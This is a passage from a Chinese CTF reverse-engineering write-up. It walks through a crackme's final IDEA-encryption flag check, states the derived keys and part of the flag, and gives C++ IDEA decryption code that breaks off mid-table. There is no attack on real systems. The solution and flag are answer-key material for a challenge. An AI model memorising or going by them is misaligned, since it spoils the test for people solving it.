c++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>得到前七个字符为：<strong>moshui_</strong></p>
<p>第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。</p>
<p><img src="/.%5C57.png" loading="lazy"></p>
<p><img src="/.%5C58.png" loading="lazy"></p>
<p>开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。</p>
<p>由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。</p>
<p>密钥：<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p>
<p><img src="/.%5C59.png" loading="lazy"></p>
<p>然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为’}’，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。</p>
<p><img src="/.%5C60.png" loading="lazy"></p>
<p>加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。</p>
<p>利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。</p>
<p><img src="/.%5C61.png" loading="lazy"></p>
<p>解密代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;16&gt; code;</span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;128&gt; key;</span><br><span class="line"></span><br><span class="line">bitset&lt;16&gt; sub_key[<span class="number">52</span>];</span><br><span class="line">bitset&lt;16&gt; inv_sub_key[<span class="number">52</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">XOR</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> code_1 ^ code_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Plus</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i) + code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp %= <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invPlus</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    tmp = <span class="number">65536</span> - tmp;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Times</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp_1 = <span class="number">0</span>, tmp_2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_1 += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">        tmp_2 += code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp_1 == <span class="number">0</span>)</span><br><span class="line">        tmp_1 = <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">if</span> (tmp_2 == <span class="number">0</span>)</span><br><span class="line">        tmp_2 = <span class="number">65536</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp = (tmp_1 * tmp_2) % <span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp == <span class="number">65536</span> ? <span class="number">0</span> : tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b)</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">Exgcd</span>(b, a % b, y, x), y -= a / b * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invTimes</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">65537</span>;</span><br><span class="line">    <span class="built_in">Exgcd</span>(tmp, p, x, y);</span><br><span class="line">    x = (x % p + p) % p;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">subkeys_get</span><span class="params">(code keys_input[<span class="number">8</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    key keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            keys[j + <span class="number">16</span> * i] = keys_input[<span class="number">7</span> - i][j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * i)];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">        keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = (<span class="number">8</span> + <span class="number">8</span> * i); j &lt; (<span class="number">8</span> * (i + <span class="number">2</span>)); j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">                sub_key[j][<span class="number">15</span> - k] = keys[<span class="number">127</span> - (k + <span class="number">16</span> * (j - <span class="number">8</span> - <span class="number">8</span> * i))];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">    keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">48</span>; i &lt; <span class="number">52</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * (i - <span class="number">48</span>))];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inv_subkeys_get</span><span class="params">(code sub_key[<span class="number">52</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span> - i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i + <span class="number">4</span>] = sub_key[<span class="number">46</span> - i];</span><br><span class="line">        inv_sub_key[i + <span class="number">5</span>] = sub_key[<span class="number">47</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">0</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">48</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">0</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">49</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">1</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">50</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">2</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">51</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">bitset&lt;64&gt; <span class="title">dencrypt</span><span class="params">(bitset&lt;<span class="number">64</span>&gt; cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bitset&lt;16&gt; I_1, I_2, I_3, I_4;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        I_1[<span class="number">15</span> - i] = cipher[<span class="number">63</span> - i];</span><br><span class="line">        I_2[<span class="number">15</span> - i] = cipher[<span class="number">47</span> - i];</span><br><span class="line">        I_3[<span class="number">15</span> - i] = cipher[<span class="number">31</span> - i];</span><br><span class="line">        I_4[i] = cipher[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bitset&lt;16&gt; tmp_1 = <span class="built_in">Times</span>(inv_sub_key[i], I_1);</span><br><span class="line">        bitset&lt;16&gt; tmp_2 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">1</span>], I_2);</span><br><span class="line">        bitset&lt;16&gt; tmp_3 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">2</span>], I_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_4 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">3</span>], I_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_5 = <span class="built_in">XOR</span>(tmp_1, tmp_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_6 = <span class="built_in">XOR</span>(tmp_2, tmp_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_7 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">4</span>], tmp_5);</span><br><span class="line">        bitset&lt;16&gt; tmp_8 = <span class="built_in">Plus</span>(tmp_6, tmp_7);</span><br><span class="line">        bitset&lt;16&gt; tmp_9 = <span class="built_in">Times</span>(tmp_8, inv_sub_key[i + <span class="number">5</span>]);</span><br><span class="line">        bitset&lt;16&gt; tmp_10 = <span class="built_in">Plus</span>(tmp_7, tmp_9);</span><br><span class="line">        I_1 = <span class="built_in">XOR</span>(tmp_1, tmp_9);</span><br><span class="line">        I_2 = <span class="built_in">XOR</span>(tmp_3, tmp_9);</span><br><span class="line">        I_3 = <span class="built_in">XOR</span>(tmp_2, tmp_10);</span><br><span class="line">        I_4 = <span class="built_in">XOR</span>(tmp_4, tmp_10);</span><br><span class="line">    &#125;</span><br><span class="line">    bitset&lt;16&gt; Y_1 = <span class="built_in">Times</span>(I_1, inv_sub_key[<span class="number">48</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_2 = <span class="built_in">Plus</span>(I_3, inv_sub_key[<span class="number">49</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_3 = <span class="built_in">Plus</span>(I_2, inv_sub_key[<span class="number">50</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_4 = <span class="built_in">Times</span>(I_4, inv_sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plaint;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plaint[i] = Y_4[i];</span><br><span class="line">        plaint[i + <span class="number">16</span>] = Y_3[i];</span><br><span class="line">        plaint[i + <span class="number">32</span>] = Y_2[i];</span><br><span class="line">        plaint[i + <span class="number">48</span>] = Y_1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> plaint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">        <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">        <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">        <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">        <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">        <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">        <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">        <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">        <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">        <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">        <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">        <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">        <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">        <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">        <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">        <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">        <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">        <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">        <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">        <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">        <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">        <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">        <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">        <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">        <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">        <span class="number">0x98D220BD</span>, <span 